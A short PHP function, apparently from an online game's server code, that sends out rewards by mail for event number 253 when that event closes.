function huodong_253_rwd($SevidCfg,$hd_info){
    huodongRwdSendMailYu($SevidCfg, $hd_info['info']['id'],253,314, $hd_info['rwd'], 140,'CLOSE');
}